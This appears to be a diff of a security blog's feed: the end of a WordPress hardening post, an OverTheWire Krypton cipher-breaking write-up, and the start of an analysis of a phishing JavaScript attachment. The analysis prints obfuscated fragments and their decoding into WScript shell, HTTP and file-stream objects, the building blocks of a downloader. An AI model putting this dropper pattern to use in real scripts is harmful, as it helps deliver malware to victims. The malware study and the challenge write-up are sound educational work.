+     &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$wp_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+     &lt;span class=&quot;nb&quot;&gt;parse_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PHP_URL_QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$wp_version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;remove_query_arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'script_loader_src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'fjarrett_remove_wp_version_strings'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'style_loader_src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'fjarrett_remove_wp_version_strings'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* Hide WP version strings from generator meta tag */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wpmudev_remove_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'the_generator'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wpmudev_remove_version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This will hide your WordPress version from all possible places. &lt;/p&gt;
+
+&lt;h1&gt;Last words&lt;/h1&gt;
+
+&lt;p&gt;Keeping your WordPress based site is very serious task, but following these tips will make it much safer than it was before, which undoubtedly will save you a lot of time in the future. But remember, there is no unhackable thing so always keep backups of your website, as in case of infection you will save more time than creating your site from scratch.  &lt;/p&gt;
+
+&lt;p&gt;I hope you learned something, from this article. As always remember and...&lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Krypton</title><link href="http://localhost:4000/2016/11/19/overthewire.org-krypton/" rel="alternate" type="text/html" title="Overthewire.org - Krypton" /><published>2016-11-19T01:00:00+01:00</published><updated>2016-11-19T01:00:00+01:00</updated><id>http://localhost:4000/2016/11/19/overthewire.org-krypton</id><content type="html" xml:base="http://localhost:4000/2016/11/19/overthewire.org-krypton/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Krypton is another wargame from OverTheWire, that is based on cryptography and cryptoanalysis. As I really love this topic I decided to give it a try, unfortunately level 6 was way harder than I thought and I couldn't complete this, but I'm still happy with the results. &lt;/p&gt;
+
+&lt;h1&gt;Krypton 0&lt;/h1&gt;
+
+&lt;p&gt;When we first access the Krypton game, we are greeted with this message. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Krypton! The first level is easy. The following string encodes the password using Base64:
+S1JZUFRPTklTR1JFQVQ=
+Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH. You can find the files for other levels in /krypton/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we know it's encoded using Base64, we can easily solve that in many ways - you can decode this string online, using built in Linux base64 module, or by writing tool in any programming language you want.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;S1JZUFRPTklTR1JFQVQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 --decode&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;Krypton 1&lt;/h1&gt;
+
+&lt;p&gt;Firstly, let's find the files to work on. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;krypton1@melinda:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /krypton
+&lt;span class=&quot;gp&quot;&gt;krypton1@melinda:/krypton$ &lt;/span&gt;ls  
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+&lt;span class=&quot;gp&quot;&gt;krypton1@melinda:/krypton$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;krypton1
+&lt;span class=&quot;gp&quot;&gt;krypton1@melinda:/krypton/krypton1$ &lt;/span&gt;ls
+README  krypton2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From this one, we know that the string is encrypted using simple Rot13 encryption, meaning that each letter in the plaintext has been moved 13 times in the alphabet to produce the ciphertext. There are also many ways to decrypt this, but I'll show you this simple script that works really well. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;krypton1@melinda:/krypton/krypton1$ &lt;/span&gt;cat krypton2 | tr &lt;span class=&quot;s1&quot;&gt;'A-Za-z'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'N-ZA-Mn-za-m'&lt;/span&gt;
+LEVEL TWO PASSWORD &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Got it! Let's move to the next one. &lt;/p&gt;
+
+&lt;h1&gt;Krypton 2&lt;/h1&gt;
+
+&lt;p&gt;As in the previous one, let's firstly move to the krypton directory. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;krypton2@melinda:/krypton/krypton2$ &lt;/span&gt;ls
+README  encrypt  keyfile.dat  krypton3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;krypton2@melinda:/krypton/krypton2$ cat README
+Krypton 2
+
+ROT13 is a simple substitution cipher.
+
+Substitution ciphers are a simple replacement algorithm.  In this example
+of a substitution cipher, we will explore a 'monoalphebetic' cipher.
+Monoalphebetic means, literally, &quot;one alphabet&quot; and you will see why.
+
+This level contains an old form of cipher called a 'Caesar Cipher'.
+A Caesar cipher shifts the alphabet by a set number.  For example:
+
+plain:	a b c d e f g h i j k ...
+cipher:	G H I J K L M N O P Q ...
+
+In this example, the letter 'a' in plaintext is replaced by a 'G' in the
+ciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext.
+
+The password for level 3 is in the file krypton3.  It is in 5 letter
+group ciphertext.  It is encrypted with a Caesar Cipher.  Without any
+further information, this cipher text may be difficult to break.  You do
+not have direct access to the key, however you do have access to a program
+that will encrypt anything you wish to give it using the key.  
+If you think logically, this is completely easy.
+
+One shot can solve it!
+
+Have fun.
+
+Additional Information:
+
+The `encrypt` binary will look for the keyfile in your current working
+directory. Therefore, it might be best to create a working direcory in /tmp
+and in there a link to the keyfile. As the `encrypt` binary runs setuid
+`krypton3`, you also need to give `krypton3` access to your working directory.
+
+Here is an example:
+
+krypton2@melinda:~$ mktemp -d
+/tmp/tmp.Wf2OnCpCDQ
+krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ
+krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat
+krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls
+keyfile.dat
+krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 .
+krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue
+krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls
+ciphertext  keyfile.dat&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This time instructions are a little bit more complicated, but whole task seems to be quite easy. Since I've previously made Python script to brute force the ciphertext, let's test it out in this situation. You can take a look at my script, but I strongly encourage you to try it by yourself! &lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/W3ndige/encryption-tools/blob/master/caesar-cipher.py&quot;&gt;Caesar-cipher.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And it worked, we've got the password to the next one: ************ !&lt;/p&gt;
+
+&lt;h1&gt;Krypton 3&lt;/h1&gt;
+
+&lt;p&gt;Wow, this seems harder than the previous ones, but that's the whole point of the challenge, right? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;krypton3@melinda:~$ cd /krypton/krypton3
+krypton3@melinda:/krypton/krypton3$ ls
+HINT1  HINT2  README  found1  found2  found3  krypton4
+krypton3@melinda:/krypton/krypton3$ cat README
+Well done.  You've moved past an easy substitution cipher.
+
+Hopefully you just encrypted the alphabet a plaintext
+to fully expose the key in one swoop.
+
+The main weakness of a simple substitution cipher is
+repeated use of a simple key.  In the previous exercise
+you were able to introduce arbitrary plaintext to expose
+the key.  In this example, the cipher mechanism is not
+available to you, the attacker.
+
+However, you have been lucky.  You have intercepted more
+than one message.  The password to the next level is found
+in the file 'krypton4'.  You have also found 3 other files.
+(found1, found2, found3)
+
+You know the following important details:
+
+- The message plaintexts are in English (*** very important)
+- They were produced from the same key (*** even better!)
+
+
+Enjoy.
+krypton3@melinda:/krypton/krypton3$ cat HINT1
+Some letters are more prevalent in English than others.
+krypton3@melinda:/krypton/krypton3$ cat HINT2
+&quot;Frequency Analysis&quot; is your friend.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I'm going to use tools from this &lt;a href=&quot;http://www.richkni.co.uk/php/crypta/index.php&quot;&gt;website&lt;/a&gt; as they really make process of analyzing the ciphertext faster. As all messages were encrypted with the same key, I have copied them into the tools to have bigger material, and to get better and more accurate samples. What will come really helpful, is the frequency of letters in English. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/overthewire-krypton/letter-frequency.jpg&quot; alt=&quot;letter-frequency&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let's slowly work out our way to the solution. Since I know that the most frequent letter that occurs is 's', I can assume that in plaintext it will be the letter 'e'. In addition 3 letter sequence - 'jds' can be matched as 'the'. &lt;/p&gt;
+&lt;p&gt;After hardly an hour of work I finally managed to find out all of the letter. Here's the encryption key: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Plaintext:   a   b   c   d   e   f   g   h   i   j   k   l   m
+Ciphertext:  b   o   i   h   g   k   n   q   v   t   w   y   u
+Plaintext:   n   o   p   q   r   s   t   u   v   w   x   y   z
+Ciphertext:  r   x   z   a   j   e   m   s   l   d   f   p   c&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now the last step is to change the letters from the ciphertext: KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS. &lt;/p&gt;
+
+&lt;p&gt;Got it! Let's move to the next one ;)&lt;/p&gt;
+
+&lt;h1&gt;Krypton 4&lt;/h1&gt;
+&lt;p&gt;This time we will work on Viegenere Cipher. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Good job!
+
+You more than likely used frequency analysis and some common sense
+to solve that one.
+
+So far we have worked with simple substitution ciphers.  They have
+also been 'monoalphabetic', meaning using a fixed key, and
+giving a one to one mapping of plaintext (P) to ciphertext (C).
+Another type of substitution cipher is referred to as 'polyalphabetic',
+where one character of P may map to many, or all, possible ciphertext
+characters.
+
+An example of a polyalphabetic cipher is called a Vigen�re Cipher.  It works
+like this:
+
+If we use the key(K)  'GOLD', and P = PROCEED MEETING AS AGREED, then &quot;add&quot;
+P to K, we get C.  When adding, if we exceed 25, then we roll to 0 (modulo 26).
+
+
+P     P R O C E   E D M E E   T I N G A   S A G R E   E D
+K     G O L D G   O L D G O   L D G O L   D G O L D   G O
+
+becomes:
+
+P     15 17 14 2  4  4  3 12  4 4  19  8 13 6  0  18 0  6 17 4 4   3
+K     6  14 11 3  6 14 11  3  6 14 11  3  6 14 11  3 6 14 11 3 6  14
+C     21 5  25 5 10 18 14 15 10 18  4 11 19 20 11 21 6 20  2 8 10 17
+
+So, we get a ciphertext of:
+
+VFZFK SOPKS ELTUL VGUCH KR
+
+This level is a Vigen�re Cipher.  You have intercepted two longer, english
+language messages.  You also have a key piece of information.  You know the
+key length!
+
+For this exercise, the key length is 6.  The password to level five is in the usual
+place, encrypted with the 6 letter key.
+
+Have fun!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can read more about this polyalphabetic cipher in my previous post &lt;a href=&quot;https://www.rootnetsec.com/2016/08/09/encryption-vigenere-cipher/&quot;&gt;Let's Talk Encryption&lt;/a&gt; dedicated to Vigenère cipher. &lt;/p&gt;
+
+&lt;p&gt;But to finish this challenge, we can use online tools, that will automate process of analyzing frequency which as you know, or may suspect, is very time consuming. I will use this &lt;a href=&quot;http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx&quot;&gt; website&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Firstly I will analyze intercepted messages to try and find the matching key. Great, key from that message seems to be &lt;b&gt;frekey&lt;/b&gt;. Now, let's see decrypt our ciphertext HCIKV RJOX resulting in the keyphrase to the next level! &lt;/p&gt;
+
+&lt;h1&gt;Krypton 5&lt;/h1&gt;
+
+&lt;p&gt;So once again we have to try frequency analysis. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Frequency analysis can break a known key length as well.  Lets try one
+last polyalphabetic cipher, but this time the key length is unknown.
+
+Enjoy.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As in the previous one, I automate the process of analysing, with result of &lt;b&gt;keylength&lt;/b&gt; as the suspect key. Let's try whether or not it works. BELOSZ decrypted using key KEYLENGTH results in the password to the next one! &lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;It was great fun to complete these challenges, Krypton 6 was unfortunately to hard to complete, but I'll definitely come back to it after gaining some more knowledge about cryptography. &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Analyzing JavaScript Malware</title><link href="http://localhost:4000/2016/10/29/analyzing-javascript-malware/" rel="alternate" type="text/html" title="Analyzing JavaScript Malware" /><published>2016-10-29T02:00:00+02:00</published><updated>2016-10-29T02:00:00+02:00</updated><id>http://localhost:4000/2016/10/29/analyzing-javascript-malware</id><content type="html" xml:base="http://localhost:4000/2016/10/29/analyzing-javascript-malware/">&lt;h1&gt;Backstory&lt;/h1&gt;
+
+&lt;p&gt;About half of a year ago, my girlfriend got e-mail from post office saying that the the package was ready to pickup, with a quick note saying that more information is available in the attachment. I was asked to look at it, as she found it suspicious - mail was written very poorly - definitely not what official mail would sound like. Firstly I took a look at the domain, from where this mail was sent, and as I excepted, it was not connected to domains of our post service. But what I really wanted to know was, what's the goal of the attachment? &lt;/p&gt;
+
+&lt;h1&gt;First contact&lt;/h1&gt;
+
+&lt;p&gt;After downloading it, I noticed that the extension of the file was &lt;b&gt;.js&lt;/b&gt; - some JavaScript file. But it was only possible because I had turned on showing files with their extensions. Someone without this option would see it only as .txt file. Viewing the source, unfortunately at first, gave me no clue how it works. Script was made of around 400 lines of code. But after looking closer it seemed, that around quarter of the code was actually part that did something, rest was only filled with assigned variables and functions returning pieces of words. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tbuloq1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;na&quot;&gt;itxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'plebydva'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8423&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;730&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ldipli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;353&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lgahze&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AtEn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ekxov&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dipyvvo'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lgahze&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;daqkuvtejqa3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+           &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ssororg0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;na&quot;&gt;lifki&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'hylxyzra'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2216&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6034&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ubylivw'&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhahbolz3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ssororg0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2216&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+           &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhahbolz3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But after some time I noticed a pattern - in last 30 lines of code, there were only references to the variables, and after connecting them together what I got, was much more readable than before. In example, if you take this piece of code and connect to the variables in the beggining, what you'll get is something more likely looking like this. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;ejybpib6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;zoracufyp7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nsatqe9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oxqokowj9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ynxyru7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exgemko2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now to make it clearer to read I have to do the same. Unfortunately I'm not completely sure that it's 'translated' 100% correctly, but it still gives me insight into how this script may work. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;ejybpib6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Finally, after around 3 hours, I got the full translation. But I've got still a few questions, what is WScript and how it works? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;ejybpib6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ehynzedda7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Scripting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FileSystemObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;elmona4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;acjihy9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MSXML2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;jyfej9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WScript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ADODB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
